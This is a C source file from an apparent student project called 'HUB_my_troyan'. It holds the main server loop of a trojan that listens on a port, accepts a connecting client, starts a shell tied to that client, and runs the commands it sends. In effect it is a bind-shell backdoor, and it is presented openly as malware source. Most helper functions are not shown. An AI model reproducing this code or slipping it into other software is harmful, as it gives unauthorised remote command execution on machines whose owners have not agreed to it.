/*
** EPITECH PROJECT, 2021
** HUB_my_troyan
** File description:
** 18/04/2021 app_start.c
*/

#include <sys/select.h>
#include "app.h"

bool loop = true;

static int client_connect(server_t *server)
{
    if (socket_server_connect(&server->client, server->sock.fd))
        return EXIT_FAILURE;
    server->client_connected = true;
    write_in_log(1, "Client connected\n");
    return EXIT_SUCCESS;
}

static int process_request(server_t *server)
{
    char *command;

    if (server->client_connected
        && FD_ISSET(server->client.fd, &server->select.read_fds)) {
        bool empty = false;
        command = socket_receive(&server->client, &empty);
        if (!command)
            return EXIT_FAILURE;
        write_in_log(3, "Command received\n", command, "\n"); // DEBUG
        if (process_command(command, server, &server->shell))
            return EXIT_FAILURE;
        free(command);
    }
    if (FD_ISSET(server->sock.fd, &server->select.read_fds)) {
        if (server->client_connected == true) {
            write_in_log(1, "Logout previous client\n"); // DEBUG
            logout_user(server);
        }
        if (client_connect(server) == EXIT_FAILURE)
            return EXIT_FAILURE;
        if (shell_client_init(&server->client, &server->shell))
            return EXIT_FAILURE;
        dprintf(server->client.fd, "Shell started\n");
    }
    return EXIT_SUCCESS;
}

static int app_loop(server_t *server)
{
    socket_t *client;
    int status = EXIT_SUCCESS;

    write_in_log(1, "Start app\n");
    while (loop) {
        client = (server->client_connected) ? &server->client : NULL;
        if (socket_server_select(&server->select, client, &server->sock)) {
            status = EXIT_FAILURE;
            break;
        }
        if (server->select.status != 0) {
            if (process_request(server) == EXIT_FAILURE) {
                break;
            }
        }
    }
    write_in_log(1, "Stop app\n");
    return status;
}

static void app_destroy(server_t *server)
{
    shell_stop(&server->shell);
    if (server->client_connected) {
        socket_close(&server->client);
    }
    socket_close(&server->sock);
}

int app_start(void)
{
    server_t server;
    int status = EXIT_SUCCESS;

    server.client_connected = false;
    server.shell.pid = -1;
    server.client.fd = -1;
    if (socket_server_create(&server.sock, PORT, MAX_CLIENT))
        return EXIT_FAILURE;
    if (signal_init() == EXIT_FAILURE)
        return EXIT_FAILURE;
    if (app_loop(&server) == EXIT_FAILURE)
        status = EXIT_FAILURE;
    app_destroy(&server);
    return status;
}